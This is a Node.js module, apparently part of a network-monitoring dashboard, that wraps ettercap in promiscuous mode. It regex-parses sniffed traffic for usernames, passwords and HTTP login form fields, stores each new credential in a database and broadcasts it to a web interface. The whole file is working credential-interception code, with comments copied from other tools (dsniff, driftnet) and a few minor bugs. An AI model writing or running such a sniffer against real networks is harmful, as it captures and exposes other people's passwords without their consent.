var spawn = require('child_process').spawn;
var config = require('config');
var Account = require('../models').Account;
var url = require('url');
var io = require('../web').io;

function ettercapParser() {

	function run() {
		console.log('Ettercap: Instantiating dsniff process.')

		var child = spawn('ettercap -Tzuqi ' + config.Monitoring.PromiscuousInterface, [], {shell: '/bin/bash'});

		// Ettercap data capture...
		child.stdout.on('data', function(data) {
			// When we get new standard output, we want to check it against a couple of
			// regex patterns.
			var connection = /^(.+?) : (.+) ->/gm
			var infoReg = /-> USER: (.+)  PASS: (.+)/gm
			var http = /^.+ INFO: (.+)\nCONTENT: usr=(.+)&pwd=(.+)$/gm
			var isIP = /(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)/gm
 			var raw = connection.exec(data.toString());
			var info = infoReg.exec(data.toString());
			var httpEx = http.exec(data.toString());
			var ip = isIP.exec(data.toString());
			//console.log(raw);
			//console.log(proto);
			// If both regex patterns yeidl useful data, then we will attempt to parse
			// the data into what we are looking for.
			if (raw) {
				var protocol = raw[1];
				if(info) {
					var username = info[1];
					var password = info[2];
					var information = "";
				}
				else {
					var username = httpEx[2];
					var password = httpEx[3];
					var information = httpEx[1];
				}
				console.log(username + ":" + password);
				if(ip) {
					var host = raw[2];
				}
				else {
					var host = url.parse(raw[2]).hostname;
				}
				console.log(host);
				// Next we will search the database to see if we have seen this specific
				// account information before.  If we havent, then we will create a
				// new database object with the information we discovered and then inform
				// the WebUI of the new data.
				Account.findOne({
					where: {
						username: username,
						password: password,
						information: information,
						protocol: protocol
					}
				}).then(function(err, result) {
					if (!(result)) {
						Account.create({
							username: username,
							password: password,
							information: information,
							parser: 'ettercap',
							protocol: protocol,
							host: host
						});
						console.log('Ettercap: Added ' + username + ':' + password + ' account');
						io.emit('accounts', {
							username: username,
							password: password,
							information: information,
							parser: 'ettercap',
							protocol: protocol,
							host: host
						});
					}
				});
			} //if
		})

		child.stderr.on('data', function(data) {
			console.log('Ettercap: (stderr): ' + data.toString().replace(/(\r\n|\n|\r)/gm, ' '));
		})

		// If driftnet exists for some reason, log the event to the console
		// and then initiate a new instance to work from.
		child.on('close', function(code) {
			console.log('Ettercap: child terminated with code ' + code);
			child = run()
		})

		child.on('error', function(error) {
			console.log('Ettercap: Failed to start process');
		})
	}

	// Lets get this baby started!
	var child = run();
}


module.exports = { parser: ettercapParser}
